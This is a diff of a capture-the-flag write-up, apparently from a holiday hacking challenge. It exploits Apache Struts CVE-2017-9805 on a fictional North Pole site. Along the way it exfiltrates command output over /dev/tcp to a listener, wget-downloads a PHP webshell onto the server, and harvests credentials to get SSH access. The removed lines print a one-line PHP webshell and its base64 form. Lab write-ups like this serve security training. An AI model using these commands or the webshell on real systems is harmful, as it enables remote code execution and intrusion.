@@ -46,6 +46,15 @@ Follows [Tom Hessman](https://twitter.com/tkh16)
 
 ### Work
 
+1. Letters to Santa has a development site.
+1. Some dev code is hidden but not removed from production site.
+1. Alabaster used Apache Struts. Sparkle Redberry added a webshell.
+1. Sparkle's webshell uses 'e' as the GET variable for commands to execute.
+1. There are other shells that can be used. I'm guessing he suggests you upload your own.
+1. Apache Struts had multiple vulnerabilites. CVE-2017-5638 is fixed but there should be another.
+1. XML formatting issues suggest encoding data.
+1. Development files will likely have credentials in them.
+
 There is a link to the development version. The div is hidden.
 
 ```
@@ -58,16 +67,43 @@ Use the struts vuln
 
 [cve-2017-9805.py](https://github.com/chrisjd20/cve-2017-9805.py)
 
-php code:
-```php
-<?php echo "<pre>" . shell_exec($_GET['e']) . "</pre>"; ?>
+Initial tests of exploit result in an error being returned instead of any information. It's unsure if anything was actually executed.
+
+We'll try downloading a webshell directly to the server then: 
+
+With trial and error and redirecting output through tcp and set a listener on the other side:
+```
+./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "ls > /dev/tcp/1.2.3.4/1234"
+```
+We discover that the l2s server uses /var/www/html as the root directory for l2s. We can dump our webshell there.
+
+```
+./cve-2017-9805.py -c "wget -O /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php" -u https://dev.northpolechristmastown.com/orders.xhtml
+```
+[Now we can peruse around](https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php). An 'ls' helps us immediately discover [GreatBookPage2.pdf](https://l2s.northpolechristmastown.com/GreatBookPage2.pdf). We appear to have issues downloading it so we'll deal with that later.
+
+The default nginx config redirects the dev server to port 8080.
+
+Looking at the process table we find:
+
+```
+alabast+   783 14.7  1.5 931068 489948 ?       Sl   03:02  32:04 /opt/jre/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dfile.encoding=UTF-8 -Dnet.sf.ehcache.skipUpdateCheck=true -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:MaxPermSize=128m -Xms512m -Xmx512m -Djava.endorsed.dirs=/opt/apache-tomcat/endorsed -classpath /opt/apache-tomcat/bin/bootstrap.jar -Dcatalina.base=/opt/apache-tomcat -Dcatalina.home=/opt/apache-tomcat -Djava.io.tmpdir=/opt/apache-tomcat/temp org.apache.catalina.startup.Bootstrap start
 ```
 
-base64:
-PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsnZSddKSAuICI8L3ByZT4iOyA/Pgo=
+So lets look at the tomcat server creds. (Need to work out how to find the class file here)
+```
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
+```
 
-command:
-echo PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsnZSddKSAuICI8L3ByZT4iOyA/Pgo= | base64 -d | 
+```
+            final String username = "alabaster_snowball";
+            final String password = "stream_unhappy_buy_loss";
+```
+Now we have credentials. It looks like we can ssh to the server. If we do we get dropped into a restricted shell. Let's try to avoid that.
+
+```
+ssh -t alabaster_snowball@dev.northpolechristmastown.com bash
+```
 
 ANSWER:
 
